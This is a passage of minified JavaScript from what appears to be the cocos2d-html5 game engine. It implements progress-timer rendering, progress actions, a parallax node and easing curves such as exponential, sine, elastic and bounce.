/**
 * Created by lcxfs1991 on 9/18/14.
 */


var e = !0,
    g = null,
    h = !1;

function k() {
    return function() {}
}

function n(a) {
    return function(b) {
        this[a] = b
    }
}

function p(a) {
    return function() {
        return this[a]
    }
}

function q(a) {
    return function() {
        return a
    }
}
cc.k = cc.NodeRGBA.extend({
    H: g,
    aa: 0,
    n: g,
    U: g,
    ya: g,
    z: h,
    bh: "ProgressTimer",
    ui: function() {
        return cc.p(this.U.x, this.U.y)
    },
    ag: function(a) {
        this.U = cc.pClamp(a, cc.p(0, 0), cc.p(1, 1))
    },
    mi: function() {
        return cc.p(this.ya.x, this.ya.y)
    },
    Xf: function(a) {
        this.ya = cc.pClamp(a, cc.p(0, 0), cc.p(1, 1))
    },
    Sb: p("H"),
    wi: p("aa"),
    Ei: p("n"),
    cg: function(a) {
        this.aa != a && (this.aa = cc.clampf(a, 0, 100), this.Kd())
    },
    setOpacityModifyRGB: k(),
    mo: q(h),
    jj: p("z"),
    cd: function(a) {
        if (a < cc.k.ve) {
            var b = cc.k.Zg;
            return this.z ? cc.p(b >> 7 - (a << 1) & 1, b >> 7 - ((a << 1) + 1) & 1) : cc.p(b >> (a << 1) + 1 & 1, b >> (a << 1) & 1)
        }
        return cc.p(0, 0)
    },
    tc: g,
    Id: 270,
    jd: 270,
    Bd: 0,
    fd: h,
    bd: g,
    t: 0,
    o: g,
    K: g,
    zf: g,
    Rb: h,
    ctor: g,
    dh: function() {
        cc.NodeRGBA.prototype.ctor.call(this);
        this.H = cc.k.ia;
        this.aa = 0;
        this.U = cc.p(0, 0);
        this.ya = cc.p(0, 0);
        this.z = h;
        this.n = g;
        this.tc = cc.p(0, 0);
        this.jd = this.Id = 270;
        this.Bd = 0;
        this.fd = h;
        this.bd = cc.rect(0, 0, 0, 0)
    },
    eh: function() {
        cc.NodeRGBA.prototype.ctor.call(this);
        this.H = cc.k.ia;
        this.aa = 0;
        this.U = cc.p(0, 0);
        this.ya = cc.p(0, 0);
        this.z = h;
        this.n = g;
        this.zf = cc._renderContext.createBuffer();
        this.t = 0;
        this.K = this.o = g;
        this.Rb = h
    },
    setColor: function(a) {
        this.n.color = a;
        this.Ec()
    },
    setOpacity: function(a) {
        this.n.opacity = a;
        this.Ec()
    },
    getColor: function() {
        return this.n.color
    },
    getOpacity: function() {
        return this.n.opacity
    },
    dg: g,
    xh: function(a) {
        this.z !== a && (this.z = a)
    },
    yh: function(a) {
        this.z !== a && (this.z = a, this.K = this.o = g, this.t = 0)
    },
    fe: g,
    zh: function(a) {
        this.n != a && (this.n = a, this.width = this.n.width, this.height = this.n.height)
    },
    Ah: function(a) {
        a && this.n != a && (this.n = a, this.width = a.width, this.height = a.height, this.o && (this.K = this.o = g, this.t = 0))
    },
    Qc: g,
    Bh: function(a) {
        a !== this.H && (this.H = a)
    },
    Ch: function(a) {
        a !== this.H && (this.o && (this.K = this.o = g, this.t = 0), this.H = a)
    },
    ee: g,
    vh: function(a) {
        this.z !== a && (this.z = a)
    },
    wh: function(a) {
        this.z !== a && (this.z = a, this.K = this.o = g, this.t = 0)
    },
    D: function(a) {
        var b = this.n;
        if (!b) return {
            ie: 0,
            je: 0
        };
        var c = b.Tf,
            d = cc.p(c.Od.u.ie, c.Od.u.je),
            c = cc.p(c.he.u.ie, c.he.u.je);
        b.mr && (b = a.x, a.x = a.y, a.y = b);
        return {
            ie: d.x * (1 - a.x) + c.x * a.x,
            je: d.y * (1 - a.y) + c.y * a.y
        }
    },
    F: function(a) {
        if (!this.n) return {
            x: 0,
            y: 0
        };
        var b = this.n.Tf,
            c = cc.p(b.Od.v.x, b.Od.v.y),
            b = cc.p(b.he.v.x, b.he.v.y);
        return {
            x: c.x * (1 - a.x) + b.x * a.x,
            y: c.y * (1 - a.y) + b.y * a.y
        }
    },
    Tb: g,
    mh: function(a) {
        this.percentage = 0;
        this.anchorY = this.anchorX = 0.5;
        this.H = cc.k.ia;
        this.z = h;
        this.midPoint = cc.p(0.5, 0.5);
        this.barChangeRate = cc.p(1, 1);
        this.sprite = a;
        return e
    },
    nh: function(a) {
        this.percentage = 0;
        this.K = this.o = g;
        this.t = 0;
        this.anchorY = this.anchorX = 0.5;
        this.H = cc.k.ia;
        this.z = h;
        this.midPoint = cc.p(0.5, 0.5);
        this.barChangeRate = cc.p(1, 1);
        this.sprite = a;
        this.Zq = cc.Yq.Jp(cc.SHADER_POSITION_TEXTURECOLOR);
        return e
    },
    draw: g,
    fh: function(a) {
        a = a || cc._renderContext;
        var b = this.n;
        b._isLighterMode && (a.globalCompositeOperation = "lighter");
        var c = cc.view.getScaleX(),
            d = cc.view.getScaleY();
        a.globalAlpha = b._displayedOpacity / 255;
        var f = b._rect,
            l = b._contentSize,
            m = b._offsetPosition,
            r = b._drawSize_Canvas,
            s = 0 | m.x,
            u = -m.y - f.height,
            v = b._textureRect_Canvas;
        r.width = f.width * c;
        r.height = f.height * d;
        a.save();
        b._flippedX && (s = -m.x - f.width, a.scale(-1, 1));
        b._flippedY && (u = m.y, a.scale(1, -1));
        s *= c;
        u *= d;
        this.H == cc.k.fc ? (f = this.bd, a.beginPath(), a.rect(f.x * c, f.y * d, f.width * c, f.height * d), a.clip(), a.closePath()) : this.H == cc.k.ia && (f = this.tc.x * c, m = this.tc.y * d, a.beginPath(), a.arc(f, m, this.Bd * d, Math.PI / 180 * this.Id, Math.PI / 180 * this.jd, this.fd), a.lineTo(f, m), a.clip(), a.closePath());
        b.Dh && v.Dr ? (c = b.Dh.dn(), this.vl ? a.drawImage(c, 0, 0, v.width, v.height, s, u, r.width, r.height) : a.drawImage(c, v.x, v.y, v.width, v.height, s, u, r.width, r.height)) : 0 !== l.width && (r = this.color, a.fillStyle = "rgba(" + r.r + "," + r.g + "," + r.b + ",1)", a.fillRect(s, u, l.width * c, l.height * d));
        a.restore();
        cc.incrementGLDraws(1)
    },
    gh: function(a) {
        a = a || cc._renderContext;
        if (this.o && this.n) {
            cc.nodeDrawSetup(this);
            var b = this.n.Rm();
            cc.bo(b.src, b.fm);
            cc.co(cc.VERTEX_ATTRIB_FLAG_POS_COLOR_TEX);
            cc.ao(this.n.kr);
            a.bindBuffer(a.ARRAY_BUFFER, this.zf);
            this.Rb && (a.bufferData(a.ARRAY_BUFFER, this.K, a.DYNAMIC_DRAW), this.Rb = h);
            b = cc.Qa.BYTES_PER_ELEMENT;
            a.vertexAttribPointer(cc.VERTEX_ATTRIB_POSITION, 2, a.FLOAT, h, b, 0);
            a.vertexAttribPointer(cc.VERTEX_ATTRIB_COLOR, 4, a.UNSIGNED_BYTE, e, b, 8);
            a.vertexAttribPointer(cc.VERTEX_ATTRIB_TEX_COORDS, 2, a.FLOAT, h, b, 12);
            this.H === cc.k.ia ? a.drawArrays(a.TRIANGLE_FAN, 0, this.t) : this.H == cc.k.fc && (this.z ? (a.drawArrays(a.TRIANGLE_STRIP, 0, this.t / 2), a.drawArrays(a.TRIANGLE_STRIP, 4, this.t / 2), cc.g_NumberOfDraws++) : a.drawArrays(a.TRIANGLE_STRIP, 0, this.t));
            cc.g_NumberOfDraws++
        }
    },
    Hh: function() {
        if (this.n) {
            var a, b = this.U;
            a = this.aa / 100;
            var c = 2 * cc.PI * (this.z ? a : 1 - a),
                d = cc.p(b.x, 1),
                f = cc.pRotateByAngle(d, b, c),
                c = 0;
            if (0 == a) f = d, c = 0;
            else if (1 == a) f = d, c = 4;
            else {
                var l = cc.FLT_MAX,
                    m = cc.k.ve;
                for (a = 0; a <= m; ++a) {
                    var r = (a + (m - 1)) % m,
                        s = this.cd(a % m),
                        r = this.cd(r);
                    0 == a ? r = cc.pLerp(s, r, 1 - b.x) : 4 == a && (s = cc.pLerp(s, r, 1 - b.x));
                    var u = cc.p(0, 0);
                    if (cc.pLineIntersect(s, r, b, f, u) && (!(0 == a || 4 == a) || 0 <= u.x && 1 >= u.x) && 0 <= u.y && u.y < l) l = u.y, c = a
                }
                f = cc.pAdd(b, cc.pMult(cc.pSub(f, b), l))
            }
            l = e;
            this.t != c + 3 && (l = h, this.K = this.o = g, this.t = 0);
            if (!this.o) {
                m = this.t = c + 3;
                s = cc.Qa.BYTES_PER_ELEMENT;
                this.K = new ArrayBuffer(m * s);
                r = [];
                for (a = 0; a < m; a++) r[a] = new cc.Qa(g, g, g, this.K, a * s);
                this.o = r;
                if (!this.o) {
                    cc.log("cc.ProgressTimer._updateRadial() : Not enough memory");
                    return
                }
            }
            this.Ec();
            m = this.o;
            if (!l) {
                m[0].u = this.D(b);
                m[0].v = this.F(b);
                m[1].u = this.D(d);
                m[1].v = this.F(d);
                for (a = 0; a < c; a++) b = this.cd(a), m[a + 2].u = this.D(b), m[a + 2].v = this.F(b)
            }
            m[this.t - 1].u = this.D(f);
            m[this.t - 1].v = this.F(f)
        }
    },
    Eh: function() {
        if (this.n) {
            var a, b = this.aa / 100,
                c = this.ya,
                c = cc.pMult(cc.p(1 - c.x + b * c.x, 1 - c.y + b * c.y), 0.5),
                b = cc.pSub(this.U, c),
                c = cc.pAdd(this.U, c);
            0 > b.x && (c.x += -b.x, b.x = 0);
            1 < c.x && (b.x -= c.x - 1, c.x = 1);
            0 > b.y && (c.y += -b.y, b.y = 0);
            1 < c.y && (b.y -= c.y - 1, c.y = 1);
            if (this.z) {
                if (!this.o) {
                    this.t = 8;
                    var d = cc.Qa.BYTES_PER_ELEMENT;
                    this.K = new ArrayBuffer(8 * d);
                    var f = [];
                    for (a = 0; 8 > a; a++) f[a] = new cc.Qa(g, g, g, this.K, a * d);
                    f[0].u = this.D(cc.p(0, 1));
                    f[0].v = this.F(cc.p(0, 1));
                    f[1].u = this.D(cc.p(0, 0));
                    f[1].v = this.F(cc.p(0, 0));
                    f[6].u = this.D(cc.p(1, 1));
                    f[6].v = this.F(cc.p(1, 1));
                    f[7].u = this.D(cc.p(1, 0));
                    f[7].v = this.F(cc.p(1, 0));
                    this.o = f
                }
                a = this.o;
                a[2].u = this.D(cc.p(b.x, c.y));
                a[2].v = this.F(cc.p(b.x, c.y));
                a[3].u = this.D(cc.p(b.x, b.y));
                a[3].v = this.F(cc.p(b.x, b.y));
                a[4].u = this.D(cc.p(c.x, c.y));
                a[4].v = this.F(cc.p(c.x, c.y));
                a[5].u = this.D(cc.p(c.x, b.y));
                a[5].v = this.F(cc.p(c.x, b.y))
            } else {
                if (!this.o) {
                    this.t = 4;
                    d = cc.Qa.BYTES_PER_ELEMENT;
                    this.K = new ArrayBuffer(4 * d);
                    this.o = [];
                    for (a = 0; 4 > a; a++) this.o[a] = new cc.Qa(g, g, g, this.K, a * d)
                }
                a = this.o;
                a[0].u = this.D(cc.p(b.x, c.y));
                a[0].v = this.F(cc.p(b.x, c.y));
                a[1].u = this.D(cc.p(b.x, b.y));
                a[1].v = this.F(cc.p(b.x, b.y));
                a[2].u = this.D(cc.p(c.x, c.y));
                a[2].v = this.F(cc.p(c.x, c.y));
                a[3].u = this.D(cc.p(c.x, b.y));
                a[3].v = this.F(cc.p(c.x, b.y))
            }
            this.Ec()
        }
    },
    Ec: function() {
        if (this.n && this.o) {
            for (var a = this.n.Tf.nr.Qh, b = this.o, c = 0, d = this.t; c < d; ++c) b[c].Qh = a;
            this.Rb = e
        }
    },
    Kd: g,
    Fh: function() {
        var a = this.n,
            b = a.width,
            c = a.height,
            d = this.U;
        if (this.H == cc.k.ia) {
            this.Bd = Math.round(Math.sqrt(b * b + c * c));
            var f, l = h,
                m = this.tc;
            m.x = b * d.x;
            m.y = -c * d.y;
            this.z ? (f = 270, d = 270 - 3.6 * this.aa) : (d = -90, f = -90 + 3.6 * this.aa);
            a._flippedX && (m.x -= b * 2 * this.U.x, d = -d - 180, f = -f - 180, l = !l);
            a._flippedY && (m.y += c * 2 * this.U.y, l = !l, d = -d, f = -f);
            this.Id = d;
            this.jd = f;
            this.fd = l
        } else {
            f = this.ya;
            m = this.aa / 100;
            l = this.bd;
            f = cc.size(b * (1 - f.x), c * (1 - f.y));
            var m = cc.size((b - f.width) * m, (c - f.height) * m),
                m = cc.size(f.width + m.width, f.height + m.height),
                r = cc.p(b * d.x, c * d.y);
            f = r.x - m.width / 2;
            0.5 < d.x && m.width / 2 >= b - r.x && (f = b - m.width);
            b = r.y - m.height / 2;
            0.5 < d.y && m.height / 2 >= c - r.y && (b = c - m.height);
            l.x = 0;
            c = 1;
            a._flippedX && (l.x -= m.width, c = -1);
            0 < f && (l.x += f * c);
            l.y = 0;
            c = 1;
            a._flippedY && (l.y += m.height, c = -1);
            0 < b && (l.y -= b * c);
            l.width = m.width;
            l.height = -m.height
        }
    },
    Gh: function() {
        var a = this.H;
        a === cc.k.ia ? this.Hh() : a === cc.k.fc && this.Eh();
        this.Rb = e
    }
});
var t = cc.k.prototype;
cc._renderType == cc._RENDER_TYPE_WEBGL ? (t.ctor = t.eh, t.dg = t.yh, t.fe = t.Ah, t.Qc = t.Ch, t.ee = t.wh, t.Tb = t.nh, t.draw = t.gh, t.Kd = t.Gh) : (t.ctor = t.dh, t.dg = t.xh, t.fe = t.zh, t.Qc = t.Bh, t.ee = t.vh, t.Tb = t.mh, t.draw = t.fh, t.Kd = cc.k.prototype.Fh);
cc.defineGetterSetter(t, "midPoint", t.ui, t.ag);
cc.defineGetterSetter(t, "barChangeRate", t.mi, t.Xf);
cc.defineGetterSetter(t, "type", t.Sb, t.Qc);
cc.defineGetterSetter(t, "percentage", t.wi, t.cg);
cc.defineGetterSetter(t, "sprite", t.Ei, t.fe);
cc.defineGetterSetter(t, "reverseDir", t.jj, t.ee);
cc.k.create = function(a) {
    var b = new cc.k;
    return b.Tb(a) ? b : g
};
cc.k.ve = 4;
cc.k.Zg = 75;
cc.k.ia = 0;
cc.k.fc = 1;
cc.Wc = cc.ActionInterval.extend({
    ba: 0,
    O: 0,
    ctor: function(a, b) {
        cc.ActionInterval.prototype.ctor.call(this);
        this.O = this.ba = 0;
        void 0 !== b && this.initWithDuration(a, b)
    },
    initWithDuration: function(a, b) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this.ba = b, e) : h
    },
    clone: function() {
        var a = new cc.Wc;
        a.initWithDuration(this.Ce, this.ba);
        return a
    },
    reverse: function() {
        cc.log("cc.ProgressTo.reverse(): reverse hasn't been supported.");
        return g
    },
    startWithTarget: function(a) {
        cc.ActionInterval.prototype.startWithTarget.call(this, a);
        this.O = a.percentage;
        100 == this.O && (this.O = 0)
    },
    update: function(a) {
        this.target instanceof cc.k && (this.target.percentage = this.O + (this.ba - this.O) * a)
    }
});
cc.Wc.create = function(a, b) {
    return new cc.Wc(a, b)
};
cc.zb = cc.ActionInterval.extend({
    ba: 0,
    O: 0,
    ctor: function(a, b, c) {
        cc.ActionInterval.prototype.ctor.call(this);
        this.O = this.ba = 0;
        void 0 !== c && this.initWithDuration(a, b, c)
    },
    initWithDuration: function(a, b, c) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this.ba = c, this.O = b, e) : h
    },
    clone: function() {
        var a = new cc.zb;
        a.initWithDuration(this.Ce, this.O, this.ba);
        return a
    },
    reverse: function() {
        return cc.zb.create(this.Ce, this.ba, this.O)
    },
    startWithTarget: function(a) {
        cc.ActionInterval.prototype.startWithTarget.call(this, a)
    },
    update: function(a) {
        this.target instanceof cc.k && (this.target.percentage = this.O + (this.ba - this.O) * a)
    }
});
cc.zb.create = function(a, b, c) {
    return new cc.zb(a, b, c)
};
cc.Vc = cc.Class.extend({
    Lb: g,
    Ib: g,
    Cb: g,
    Gn: p("Lb"),
    Nq: n("Lb"),
    mn: p("Ib"),
    tq: n("Ib"),
    Ym: p("Cb"),
    Vj: n("Cb"),
    $i: function(a, b) {
        this.Lb = a;
        this.Ib = b;
        this.Cb = g;
        return e
    }
});
cc.Vc.create = function(a, b) {
    var c = new cc.Vc;
    c.$i(a, b);
    return c
};
cc.yb = cc.NodeRGBA.extend({
    Fa: g,
    ud: g,
    bh: "ParallaxNode",
    rn: p("Fa"),
    wq: n("Fa"),
    ctor: function() {
        cc.NodeRGBA.prototype.ctor.call(this);
        this.Fa = [];
        this.ud = cc.p(-100, -100)
    },
    addChild: function(a, b, c, d) {
        if (3 === arguments.length) cc.log("ParallaxNode: use addChild(child, z, ratio, offset) instead");
        else {
            if (!a) throw "cc.ParallaxNode.addChild(): child should be non-null";
            var f = cc.Vc.create(c, d);
            f.Vj(a);
            this.Fa.push(f);
            a.setPosition(this._position.x * c.x + d.x, this._position.y * c.y + d.y);
            cc.NodeRGBA.prototype.addChild.call(this, a, b, a.tag)
        }
    },
    removeChild: function(a, b) {
        for (var c = this.Fa, d = 0; d < c.length; d++) if (c[d].Cb == a) {
            c.splice(d, 1);
            break
        }
        cc.NodeRGBA.prototype.removeChild.call(this, a, b)
    },
    Gj: function(a) {
        this.Fa.length = 0;
        cc.NodeRGBA.prototype.Gj.call(this, a)
    },
    visit: function() {
        var a = this.ah();
        if (!cc.pointEqualToPoint(a, this.ud)) {
            for (var b = this.Fa, c = 0, d = b.length; c < d; c++) {
                var f = b[c];
                f.Cb.setPosition(-a.x + a.x * f.Lb.x + f.Ib.x, -a.y + a.y * f.Lb.y + f.Ib.y)
            }
            this.ud = a
        }
        cc.NodeRGBA.prototype.visit.call(this)
    },
    ah: function() {
        for (var a = this._position, b = this; b.parent != g;) b = b.parent, a = cc.pAdd(a, b.getPosition());
        return a
    }
});
cc.yb.create = function() {
    return new cc.yb
};
cc.h = cc.ActionInterval.extend({
    d: g,
    ctor: function(a) {
        cc.ActionInterval.prototype.ctor.call(this);
        a && this.initWithAction(a)
    },
    initWithAction: function(a) {
        if (!a) throw "cc.ActionEase.initWithAction(): action must be non nil";
        return this.initWithDuration(a.getDuration()) ? (this.d = a, e) : h
    },
    clone: function() {
        var a = new cc.h;
        a.initWithAction(this.d.clone());
        return a
    },
    startWithTarget: function(a) {
        cc.ActionInterval.prototype.startWithTarget.call(this, a);
        this.d.startWithTarget(this.target)
    },
    stop: function() {
        this.d.stop();
        cc.ActionInterval.prototype.stop.call(this)
    },
    update: function(a) {
        this.d.update(a)
    },
    reverse: function() {
        return cc.h.create(this.d.reverse())
    },
    en: p("d")
});
cc.h.create = function(a) {
    return new cc.h(a)
};
cc.ua = cc.h.extend({
    m: 0,
    ctor: function(a, b) {
        cc.h.prototype.ctor.call(this);
        void 0 !== b && this.initWithAction(a, b)
    },
    Lq: n("m"),
    Fn: p("m"),
    initWithAction: function(a, b) {
        return cc.h.prototype.initWithAction.call(this, a) ? (this.m = b, e) : h
    },
    clone: function() {
        var a = new cc.ua;
        a.initWithAction(this.d.clone(), this.m);
        return a
    },
    reverse: function() {
        return cc.ua.create(this.d.reverse(), 1 / this.m)
    }
});
cc.ua.create = function(a, b) {
    return new cc.ua(a, b)
};
cc.ec = cc.ua.extend({
    update: function(a) {
        this.d.update(Math.pow(a, this.m))
    },
    reverse: function() {
        return cc.ec.create(this.d.reverse(), 1 / this.m)
    },
    clone: function() {
        var a = new cc.ec;
        a.initWithAction(this.d.clone(), this.m);
        return a
    }
});
cc.ec.create = function(a, b) {
    return new cc.ec(a, b)
};
cc.gi = function(a) {
    return {
        m: a,
        i: function(a) {
            return Math.pow(a, this.m)
        },
        reverse: function() {
            return cc.gi(1 / this.m)
        }
    }
};
cc.ob = cc.ua.extend({
    update: function(a) {
        this.d.update(Math.pow(a, 1 / this.m))
    },
    reverse: function() {
        return cc.ob.create(this.d.reverse(), 1 / this.m)
    },
    clone: function() {
        var a = new cc.ob;
        a.initWithAction(this.d.clone(), this.m);
        return a
    }
});
cc.ob.create = function(a, b) {
    return new cc.ob(a, b)
};
cc.ii = function(a) {
    return {
        m: a,
        i: function(a) {
            return Math.pow(a, 1 / this.m)
        },
        reverse: function() {
            return cc.ii(1 / this.m)
        }
    }
};
cc.nb = cc.ua.extend({
    update: function(a) {
        a *= 2;
        1 > a ? this.d.update(0.5 * Math.pow(a, this.m)) : this.d.update(1 - 0.5 * Math.pow(2 - a, this.m))
    },
    clone: function() {
        var a = new cc.nb;
        a.initWithAction(this.d.clone(), this.m);
        return a
    },
    reverse: function() {
        return cc.nb.create(this.d.reverse(), this.m)
    }
});
cc.nb.create = function(a, b) {
    return new cc.nb(a, b)
};
cc.hi = function(a) {
    return {
        m: a,
        i: function(a) {
            a *= 2;
            return 1 > a ? 0.5 * Math.pow(a, this.m) : 1 - 0.5 * Math.pow(2 - a, this.m)
        },
        reverse: function() {
            return cc.hi(this.m)
        }
    }
};
cc.cc = cc.h.extend({
    update: function(a) {
        this.d.update(0 === a ? 0 : Math.pow(2, 10 * (a - 1)))
    },
    reverse: function() {
        return cc.Ma.create(this.d.reverse())
    },
    clone: function() {
        var a = new cc.cc;
        a.initWithAction(this.d.clone());
        return a
    }
});
cc.cc.create = function(a) {
    return new cc.cc(a)
};
cc.Re = {
    i: function(a) {
        return 0 === a ? 0 : Math.pow(2, 10 * (a - 1))
    },
    reverse: function() {
        return cc.Te
    }
};
cc.sm = function() {
    return cc.Re
};
cc.Ma = cc.h.extend({
    update: function(a) {
        this.d.update(1 == a ? 1 : -Math.pow(2, -10 * a) + 1)
    },
    reverse: function() {
        return cc.cc.create(this.d.reverse())
    },
    clone: function() {
        var a = new cc.Ma;
        a.initWithAction(this.d.clone());
        return a
    }
});
cc.Ma.create = function(a) {
    return new cc.Ma(a)
};
cc.Te = {
    i: function(a) {
        return 1 == a ? 1 : -Math.pow(2, -10 * a) + 1
    },
    reverse: function() {
        return cc.Re
    }
};
cc.um = function() {
    return cc.Te
};
cc.dc = cc.h.extend({
    update: function(a) {
        1 != a && 0 !== a && (a *= 2, a = 1 > a ? 0.5 * Math.pow(2, 10 * (a - 1)) : 0.5 * (-Math.pow(2, -10 * (a - 1)) + 2));
        this.d.update(a)
    },
    reverse: function() {
        return cc.dc.create(this.d.reverse())
    },
    clone: function() {
        var a = new cc.dc;
        a.initWithAction(this.d.clone());
        return a
    }
});
cc.dc.create = function(a) {
    return new cc.dc(a)
};
cc.Se = {
    i: function(a) {
        return 1 !== a && 0 !== a ? (a *= 2, 1 > a ? 0.5 * Math.pow(2, 10 * (a - 1)) : 0.5 * (-Math.pow(2, -10 * (a - 1)) + 2)) : a
    },
    reverse: function() {
        return cc.Se
    }
};
cc.tm = function() {
    return cc.Se
};
cc.Na = cc.h.extend({
    update: function(a) {
        a = 0 === a || 1 === a ? a : -1 * Math.cos(a * Math.PI / 2) + 1;
        this.d.update(a)
    },
    reverse: function() {
        return cc.Oa.create(this.d.reverse())
    },
    clone: function() {
        var a = new cc.Na;
        a.initWithAction(this.d.clone());
        return a
    }
});
cc.Na.create = function(a) {
    return new cc.Na(a)
};
cc.cf = {
    i: function(a) {
        return 0 === a || 1 === a ? a : -1 * Math.cos(a * Math.PI / 2) + 1
    },
    reverse: function() {
        return cc.ef
    }
};
cc.Em = function() {
    return cc.cf
};
cc.Oa = cc.h.extend({
    update: function(a) {
        a = 0 === a || 1 === a ? a : Math.sin(a * Math.PI / 2);
        this.d.update(a)
    },
    reverse: function() {
        return cc.Na.create(this.d.reverse())
    },
    clone: function() {
        var a = new cc.Oa;
        a.initWithAction(this.d.clone());
        return a
    }
});
cc.Oa.create = function(a) {
    return new cc.Oa(a)
};
cc.ef = {
    i: function(a) {
        return 0 === a || 1 == a ? a : Math.sin(a * Math.PI / 2)
    },
    reverse: function() {
        return cc.cf
    }
};
cc.Gm = function() {
    return cc.ef
};
cc.va = cc.h.extend({
    update: function(a) {
        a = 0 === a || 1 === a ? a : -0.5 * (Math.cos(Math.PI * a) - 1);
        this.d.update(a)
    },
    clone: function() {
        var a = new cc.va;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.va.create(this.d.reverse())
    }
});
cc.va.create = function(a) {
    return new cc.va(a)
};
cc.df = {
    i: function(a) {
        return 0 === a || 1 === a ? a : -0.5 * (Math.cos(Math.PI * a) - 1)
    },
    reverse: function() {
        return cc.df
    }
};
cc.Fm = function() {
    return cc.df
};
cc.Ka = cc.h.extend({
    j: 0.3,
    ctor: function(a, b) {
        cc.h.prototype.ctor.call(this);
        a && this.initWithAction(a, b)
    },
    vn: p("j"),
    Bq: n("j"),
    initWithAction: function(a, b) {
        cc.h.prototype.initWithAction.call(this, a);
        this.j = b == g ? 0.3 : b;
        return e
    },
    reverse: function() {
        cc.log("cc.EaseElastic.reverse(): it should be overridden in subclass.");
        return g
    },
    clone: function() {
        var a = new cc.Ka;
        a.initWithAction(this.d.clone(), this.j);
        return a
    }
});
cc.Ka.create = function(a, b) {
    return new cc.Ka(a, b)
};
cc.ac = cc.Ka.extend({
    update: function(a) {
        var b = 0;
        0 === a || 1 === a ? b = a : (b = this.j / 4, a -= 1, b = -Math.pow(2, 10 * a) * Math.sin(2 * (a - b) * Math.PI / this.j));
        this.d.update(b)
    },
    reverse: function() {
        return cc.La.create(this.d.reverse(), this.j)
    },
    clone: function() {
        var a = new cc.ac;
        a.initWithAction(this.d.clone(), this.j);
        return a
    }
});
cc.ac.create = function(a, b) {
    return new cc.ac(a, b)
};
cc.Pe = {
    i: function(a) {
        if (0 === a || 1 === a) return a;
        a -= 1;
        return -Math.pow(2, 10 * a) * Math.sin(2 * (a - 0.075) * Math.PI / 0.3)
    },
    reverse: function() {
        return cc.Qe
    }
};
cc.di = function(a) {
    return a && 0.3 !== a ? {
        j: a,
        i: function(a) {
            if (0 === a || 1 === a) return a;
            a -= 1;
            return -Math.pow(2, 10 * a) * Math.sin(2 * (a - this.j / 4) * Math.PI / this.j)
        },
        reverse: function() {
            return cc.fi(this.j)
        }
    } : cc.Pe
};
cc.La = cc.Ka.extend({
    update: function(a) {
        var b = 0,
            b = 0 === a || 1 == a ? a : Math.pow(2, -10 * a) * Math.sin(2 * (a - this.j / 4) * Math.PI / this.j) + 1;
        this.d.update(b)
    },
    reverse: function() {
        return cc.ac.create(this.d.reverse(), this.j)
    },
    clone: function() {
        var a = new cc.La;
        a.initWithAction(this.d.clone(), this.j);
        return a
    }
});
cc.La.create = function(a, b) {
    return new cc.La(a, b)
};
cc.Qe = {
    i: function(a) {
        return 0 === a || 1 === a ? a : Math.pow(2, -10 * a) * Math.sin(2 * (a - 0.075) * Math.PI / 0.3) + 1
    },
    reverse: function() {
        return cc.Pe
    }
};
cc.fi = function(a) {
    return a && 0.3 !== a ? {
        j: a,
        i: function(a) {
            return 0 === a || 1 === a ? a : Math.pow(2, -10 * a) * Math.sin(2 * (a - this.j / 4) * Math.PI / this.j) + 1
        },
        reverse: function() {
            return cc.di(this.j)
        }
    } : cc.Qe
};
cc.bc = cc.Ka.extend({
    update: function(a) {
        var b = 0,
            b = this.j;
        if (0 === a || 1 == a) b = a;
        else {
            b || (b = this.j = 0.3 * 1.5);
            var c = b / 4;
            a = 2 * a - 1;
            b = 0 > a ? -0.5 * Math.pow(2, 10 * a) * Math.sin(2 * (a - c) * Math.PI / b) : 0.5 * Math.pow(2, -10 * a) * Math.sin(2 * (a - c) * Math.PI / b) + 1
        }
        this.d.update(b)
    },
    reverse: function() {
        return cc.bc.create(this.d.reverse(), this.j)
    },
    clone: function() {
        var a = new cc.bc;
        a.initWithAction(this.d.clone(), this.j);
        return a
    }
});
cc.bc.create = function(a, b) {
    return new cc.bc(a, b)
};
cc.ei = function(a) {
    return {
        j: a || 0.3,
        i: function(a) {
            var c = 0,
                c = this.j;
            if (0 === a || 1 === a) c = a;
            else {
                c || (c = this.j = 0.3 * 1.5);
                var d = c / 4;
                a = 2 * a - 1;
                c = 0 > a ? -0.5 * Math.pow(2, 10 * a) * Math.sin(2 * (a - d) * Math.PI / c) : 0.5 * Math.pow(2, -10 * a) * Math.sin(2 * (a - d) * Math.PI / c) + 1
            }
            return c
        },
        reverse: function() {
            return cc.ei(this.j)
        }
    }
};
cc.ta = cc.h.extend({
    Gc: function(a) {
        if (a < 1 / 2.75) return 7.5625 * a * a;
        if (a < 2 / 2.75) return a -= 1.5 / 2.75, 7.5625 * a * a + 0.75;
        if (a < 2.5 / 2.75) return a -= 2.25 / 2.75, 7.5625 * a * a + 0.9375;
        a -= 2.625 / 2.75;
        return 7.5625 * a * a + 0.984375
    },
    clone: function() {
        var a = new cc.ta;
        a.initWithAction(this.d.clone());
        return a
    },
    reverse: function() {
        return cc.ta.create(this.d.reverse())
    }
});
cc.ta.create = function(a) {
    return new cc.ta(a)
};
cc.Yb = cc.ta.extend({
    update: function(a) {
        this.d.update(1 - this.Gc(1 - a))
    },
    reverse: function() {
        return cc.$b.create(this.d.reverse())
    },
    clone: function() {
        var a = new cc.Yb;
        a.initWithAction(this.d.clone());
        return a
    }
});
cc.Yb.create = function(a) {
    return new cc.Yb(a)
};
cc.gc = function(a) {
    if (a < 1 / 2.75) return 7.5625 * a * a;
    if (a < 2 / 2.75) return a -= 1.5 / 2.75, 7.5625 * a * a + 0.75;
    if (a < 2.5 / 2.75) return a -= 2.25 / 2.75, 7.5625 * a * a + 0.9375;
    a -= 2.625 / 2.75;
    return 7.5625 * a * a + 0.984375
};
cc.Ge = {
    i: function(a) {
        return 1 - cc.gc(1 - a)
    },
    reverse: function() {
        return cc.Ie
    }
};
cc.jm = function() {
    return cc.Ge
};
cc.$b = cc.ta.extend({
    update: function(a) {
        this.d.update(this.Gc(a))
    },
    reverse: function() {
        return cc.Yb.create(this.d.reverse())
    },
    clone: function() {
        var a = new cc.$b;
        a.initWithAction(this.d.clone());
        return a
    }
});
cc.$b.create = function(a) {
    return new cc.$b(a)
};
cc.Ie = {
    i: function(a) {
        return cc.gc(a)
    },
    reverse: function() {
        return cc.Ge
    }
};
cc.lm = function() {
    return cc.Ie
};
cc.Zb = cc.ta.extend({
    update: function(a) {
        var b = 0,
